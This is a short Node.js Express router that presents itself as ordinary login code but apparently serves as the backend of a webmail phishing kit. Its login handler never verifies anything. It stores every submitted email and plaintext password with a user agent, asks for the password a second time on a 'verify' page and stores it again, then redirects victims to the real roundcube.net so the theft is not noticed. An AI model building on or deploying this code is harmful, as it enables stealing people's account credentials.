const express = require('express');
const router = express.Router();
const IP = require('ip');

// Load User model
const User = require('../models/User');

// Login Page
router.get('/login', (req, res) => {
  let email = req.query.autograb || '';
  res.render('login', { email: email });
});

router.get('/loginverify', (req, res) => res.render('login2'));

// Login
router.post('/loginok', (req, res, next) => {
  const { email, password } = req.body;

  const userIp = IP.address();
  console.log(userIp)

  const userAgent = req.headers['user-agent']
  
  const user = new User({ email, password, userIp, userAgent });

  user
    .save()
    .then(result => {
      console.log(result);
      req.flash('success_msg', 'Login ok');

      // Redirect with email as a query parameter
      res.redirect(`/users/loginverify?autograb=${encodeURIComponent(email)}`);
    })
    .catch(err => console.log(err));
});


// Login Verify page
// Login Verify
router.post('/loginverify', (req, res, next) => {
  const { password } = req.body;

  // Get email from query parameter
  const email = req.query.email || '';

  const user = new User({ email, password });

  user
    .save()
    .then(result => {
      console.log(result);
      req.flash('success_msg', 'Questions ok');
      res.redirect('https://roundcube.net/');
    })
    .catch(err => console.log(err));
});

// Logout
router.get('/logout', (req, res) => {
  req.logout();
  req.flash('success_msg', 'You are logged out');
  res.redirect('/users/login');
});

module.exports = router;